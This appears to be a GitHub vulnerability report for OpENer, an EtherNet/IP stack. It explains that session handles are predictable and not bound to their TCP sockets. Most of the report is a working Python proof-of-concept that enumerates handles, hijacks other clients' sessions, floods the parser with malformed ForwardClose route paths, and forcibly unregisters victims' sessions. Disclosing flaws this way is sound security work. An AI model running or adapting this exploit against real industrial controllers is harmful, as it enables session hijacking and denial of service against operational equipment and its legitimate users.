@@ -1,0 +1,310 @@
+issue #565
+
+Vulnerability Description
+
+OpENer (commit 76b95cf) suffers from an Incorrect Access Control vulnerability in its handling of encapsulation sessions. When the server processes critical encapsulation commands, it verifies whether the provided session_handle exists in the global session list, but it fails to verify whether that handle belongs to the specific TCP connection issuing the request. Because there is no strong binding between a session handle and its originating socket, any attacker on the network can use a valid session handle created by another legitimate client to bypass access controls. This access control failure leads to severe impacts, including Session Hijacking and Cross-Connection DoS.
+
+Root Cause
+
+The root cause lies in the encapsulation session authentication logic failing to enforce a "handle-to-socket" binding:
+
+Missing Socket Binding Validation: In encap.c, the CheckRegisteredSessions() function only checks if the provided session_handle is active. It does not verify if the session is owned by the socket making the current request.
+Reused Authentication Flaw: This inadequate check is used across critical command paths (e.g., SendRRData, SendUnitData), allowing an attacker to pass the authentication flow using a victim's handle on an entirely different TCP connection.
+Cross-Connection Unregistration: The UnregisterSession path closes the session resources based solely on the handle without verifying the request's origin socket. This enables an attacker to remotely terminate any active session.
+Predictable Handles: Session handles are generated as small, predictable integers (e.g., index + 1), significantly lowering the attack complexity for enumerating active sessions.
+
+PoC
+
+import argparse
+import socket
+import struct
+import sys
+import time
+from typing import List, Optional, Tuple
+
+ENCAP_HEADER_LEN = 24
+CMD_REGISTER_SESSION = 0x0065
+CMD_UNREGISTER_SESSION = 0x0066
+CMD_SEND_RR_DATA = 0x006F
+
+ITEM_NULL = 0x0000
+ITEM_UCMM = 0x00B2
+
+SERVICE_GET_ATTRIBUTES_ALL = 0x01
+SERVICE_FORWARD_CLOSE = 0x4E
+
+STATUS_INVALID_SESSION_HANDLE = 0x0064
+
+
+def encap_header(command: int, length: int, session: int, context: bytes) -> bytes:
+    return (
+        struct.pack("<H", command)
+        + struct.pack("<H", length)
+        + struct.pack("<I", session)
+        + b"\x00" * 4
+        + context[:8].ljust(8, b"\x00")
+        + b"\x00" * 4
+    )
+
+
+def recv_exact(sock: socket.socket, size: int) -> bytes:
+    data = b""
+    while len(data) < size:
+        chunk = sock.recv(size - len(data))
+        if not chunk:
+            raise ConnectionError("socket closed by peer")
+        data += chunk
+    return data
+
+
+def recv_enip(sock: socket.socket) -> Optional[bytes]:
+    try:
+        header = recv_exact(sock, ENCAP_HEADER_LEN)
+    except Exception:
+        return None
+    _, payload_len, _, _ = struct.unpack("<HHII", header[:12])
+    if payload_len == 0:
+        return header
+    try:
+        payload = recv_exact(sock, payload_len)
+    except Exception:
+        return None
+    return header + payload
+
+
+def register_session(sock: socket.socket) -> Tuple[int, int]:
+    req = encap_header(CMD_REGISTER_SESSION, 4, 0, b"ATKREG01") + struct.pack("<HH", 1, 0)
+    sock.sendall(req)
+    rsp = recv_enip(sock)
+    if rsp is None or len(rsp) < ENCAP_HEADER_LEN:
+        raise RuntimeError("RegisterSession got empty response")
+    cmd, _, session, status = struct.unpack("<HHII", rsp[:12])
+    if cmd != CMD_REGISTER_SESSION:
+        raise RuntimeError(f"unexpected command 0x{cmd:04x}")
+    return session, status
+
+
+def build_benign_cip() -> bytes:
+    # Get_Attributes_All Identity object: service 0x01, path words=2, class=1, instance=1
+    return bytes([SERVICE_GET_ATTRIBUTES_ALL, 0x02, 0x20, 0x01, 0x24, 0x01])
+
+
+def build_asan_stress_cip(route_path_len: int) -> bytes:
+    # ForwardClose with extremely long route path and zero request-data bytes.
+    # This keeps traffic in SendRRData path while stressing deeper parser code.
+    if route_path_len < 4 or (route_path_len % 2) != 0:
+        raise ValueError("route_path_len must be even and >= 4")
+    path_head = bytes([0x20, 0x06, 0x24, 0x01])  # Connection Manager class/instance
+    fill = b"\x28\x00" * ((route_path_len - len(path_head)) // 2)
+    route_path = path_head + fill
+    path_words = len(route_path) // 2
+    if path_words > 0xFF:
+        raise ValueError("route_path_len too large for 8-bit path-size field")
+    return bytes([SERVICE_FORWARD_CLOSE, path_words]) + route_path
+
+
+def send_rr(sock: socket.socket, forged_session: int, context: bytes, cip_payload: bytes) -> Optional[bytes]:
+    cpf = (
+        struct.pack("<H", 2)
+        + struct.pack("<H", ITEM_NULL)
+        + struct.pack("<H", 0)
+        + struct.pack("<H", ITEM_UCMM)
+        + struct.pack("<H", len(cip_payload))
+        + cip_payload
+    )
+    command_specific = b"\x00" * 4 + b"\x00" * 2 + cpf
+    frame = (
+        encap_header(CMD_SEND_RR_DATA, len(command_specific), forged_session, context)
+        + command_specific
+    )
+    sock.sendall(frame)
+    return recv_enip(sock)
+
+
+def send_unregister(sock: socket.socket, victim_session: int, context: bytes) -> None:
+    req = encap_header(CMD_UNREGISTER_SESSION, 0, victim_session, context)
+    sock.sendall(req)
+
+
+def parse_enip_status(rsp: bytes) -> int:
+    if len(rsp) < ENCAP_HEADER_LEN:
+        raise ValueError("short ENIP response")
+    return struct.unpack("<I", rsp[8:12])[0]
+
+
+def discover_hijackable_sessions(
+    sock: socket.socket, handles: List[int], timeout: float
+) -> List[int]:
+    accepted: List[int] = []
+    for h in handles:
+        ctx = f"HJ{h:06d}".encode("ascii")[:8]
+        try:
+            sock.settimeout(timeout)
+            rsp = send_rr(sock, h, ctx, build_benign_cip())
+            if rsp is None:
+                print(f"[probe h={h:02d}] no response (possible reset/crash)")
+                continue
+            status = parse_enip_status(rsp)
+            if status != STATUS_INVALID_SESSION_HANDLE:
+                accepted.append(h)
+                print(
+                    f"[probe h={h:02d}] ACCEPTED status=0x{status:08x} "
+                    "(indicates handle exists and is accepted on attacker socket)"
+                )
+            else:
+                print(f"[probe h={h:02d}] invalid-session")
+        except Exception as exc:  # noqa: BLE001
+            print(f"[probe h={h:02d}] error: {type(exc).__name__}: {exc}")
+    return accepted
+
+
+def stress_asan_with_hijacked_session(
+    sock: socket.socket,
+    hijacked_handles: List[int],
+    rounds: int,
+    timeout: float,
+    route_path_len: int,
+    interval_ms: int,
+) -> None:
+    if rounds <= 0 or not hijacked_handles:
+        return
+    payload = build_asan_stress_cip(route_path_len)
+    print(
+        f"[*] ASan-stress mode: hijacked_handles={hijacked_handles} rounds={rounds} "
+        f"payload_len={len(payload)} route_path_len={route_path_len}"
+    )
+    for i in range(rounds):
+        for h in hijacked_handles:
+            ctx = f"AS{i:02d}{h:04d}".encode("ascii")[:8]
+            try:
+                sock.settimeout(timeout)
+                rsp = send_rr(sock, h, ctx, payload)
+                if rsp is None:
+                    print(f"[asan {i + 1:03d}] h={h:02d} no-response (possible abort/reset)")
+                    continue
+                status = parse_enip_status(rsp)
+                print(f"[asan {i + 1:03d}] h={h:02d} status=0x{status:08x} rsp_len={len(rsp)}")
+            except Exception as exc:  # noqa: BLE001
+                print(f"[asan {i + 1:03d}] h={h:02d} error: {type(exc).__name__}: {exc}")
+            if interval_ms > 0:
+                time.sleep(interval_ms / 1000.0)
+
+
+def parse_target_handles(victim_session: int, max_handle: int) -> List[int]:
+    if victim_session > 0:
+        return [victim_session]
+    return list(range(1, max_handle + 1))
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(
+        description="PoC attacker for ENIP session-handle/socket binding flaw"
+    )
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=44818)
+    parser.add_argument("--timeout", type=float, default=1.5)
+    parser.add_argument(
+        "--victim-session",
+        type=int,
+        default=0,
+        help="known victim session handle; 0 means brute-force 1..max-handle",
+    )
+    parser.add_argument("--max-handle", type=int, default=20)
+    parser.add_argument(
+        "--register-attacker",
+        action="store_true",
+        help="optionally register attacker session for comparison/debug",
+    )
+    parser.add_argument(
+        "--no-unregister",
+        action="store_true",
+        help="disable default cross-connection UnregisterSession",
+    )
+    parser.add_argument(
+        "--asan-rounds",
+        type=int,
+        default=0,
+        help="rounds of malformed SendRRData over hijacked session handles",
+    )
+    parser.add_argument(
+        "--route-path-len",
+        type=int,
+        default=470,
+        help="malicious CIP route path length (even, <= 510 and usually <= 470)",
+    )
+    parser.add_argument("--interval-ms", type=int, default=5)
+    args = parser.parse_args()
+
+    if args.max_handle <= 0:
+        raise ValueError("--max-handle must be > 0")
+    if args.victim_session < 0:
+        raise ValueError("--victim-session must be >= 0")
+    if args.route_path_len <= 0 or args.route_path_len % 2 != 0:
+        raise ValueError("--route-path-len must be positive and even")
+    if args.asan_rounds < 0:
+        raise ValueError("--asan-rounds must be >= 0")
+
+    target_handles = parse_target_handles(args.victim_session, args.max_handle)
+    print(f"[*] target={args.host}:{args.port} handles={target_handles}")
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(args.timeout)
+    try:
+        sock.connect((args.host, args.port))
+        print("[+] attacker connected")
+
+        if args.register_attacker:
+            my_session, my_status = register_session(sock)
+            print(
+                f"[+] attacker RegisterSession status=0x{my_status:08x} "
+                f"session_handle={my_session}"
+            )
+
+        hijacked_handles = discover_hijackable_sessions(
+            sock, target_handles, timeout=args.timeout
+        )
+        if not hijacked_handles:
+            print("[!] no hijackable handle discovered in current range")
+        else:
+            print(f"[+] hijackable handles discovered: {hijacked_handles}")
+
+        stress_asan_with_hijacked_session(
+            sock=sock,
+            hijacked_handles=hijacked_handles,
+            rounds=args.asan_rounds,
+            timeout=args.timeout,
+            route_path_len=args.route_path_len,
+            interval_ms=args.interval_ms,
+        )
+
+        if not args.no_unregister:
+            print("[*] sending cross-connection UnregisterSession...")
+            for h in target_handles:
+                try:
+                    send_unregister(sock, h, f"UNREG{h:03d}".encode("ascii")[:8])
+                    print(f"[unreg h={h:02d}] sent")
+                except Exception as exc:  # noqa: BLE001
+                    print(f"[unreg h={h:02d}] error: {type(exc).__name__}: {exc}")
+                if args.interval_ms > 0:
+                    time.sleep(args.interval_ms / 1000.0)
+
+        print("[*] done")
+        return 0
+    except Exception as exc:  # noqa: BLE001
+        print(f"[!] attacker error: {type(exc).__name__}: {exc}")
+        return 1
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+
+) Observe Phenomena:
+
+Attacker Terminal: The attacker script successfully bypasses access control by enumerating and utilizing the valid session_handle, and then sends the UnregisterSession command.
+Server Logs: The server processes the forged unregister request, destroying the session and forcefully closing the legitimate client's TCP socket.
+Legitimate Client Terminal: The normal_client.py probe fails immediately, reporting DISCONNECTED: connection closed/no response because the underlying connection was unilaterally severed by the server.
